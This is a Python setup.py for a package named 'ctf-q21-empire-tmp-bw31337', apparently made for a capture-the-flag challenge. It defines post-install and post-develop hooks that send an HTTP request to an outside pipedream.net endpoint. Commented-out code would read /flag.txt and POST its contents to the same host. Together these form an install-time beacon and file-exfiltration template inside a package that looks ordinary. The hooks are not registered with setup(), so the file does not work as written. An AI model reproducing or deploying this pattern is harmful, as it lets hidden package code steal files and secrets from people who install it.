import setuptools
from setuptools import setup
import os
import http.client
from setuptools.command.develop import develop
from setuptools.command.install import install
from subprocess import check_call

setup(
    name='ctf-q21-empire-tmp-bw31337',
    description='test',
    version='0.0.13',
    packages=['main'],
    install_requires=[
      'requests',
      'http.client'
    ],
    )


# def sendtourl(info):
#     conn = http.client.HTTPSConnection('en6rzi93fenj92p.m.pipedream.net')
#     conn.request("POST", "/", '{"mock_data": "true","ip_address": "92.188.61.181","email": "user@example.com","user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30","url": "http://example.com/","test": f"{info}"}', {'Content-Type': 'application/json'})

class PostDevelopCommand(develop):
    """Post-installation for development mode."""
    def run(self):
        develop.run(self)
        # import os
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        # sendtourl(os.popen("cat /flag.txt").read())
        import requests
        requests.get("https://en6rzi93fenj92p.m.pipedream.net/?hehe=test")
        
class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        # import os
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        # sendtourl(os.popen("cat /flag.txt").read())
        import requests
        requests.get("https://en6rzi93fenj92p.m.pipedream.net/?hehe=test")
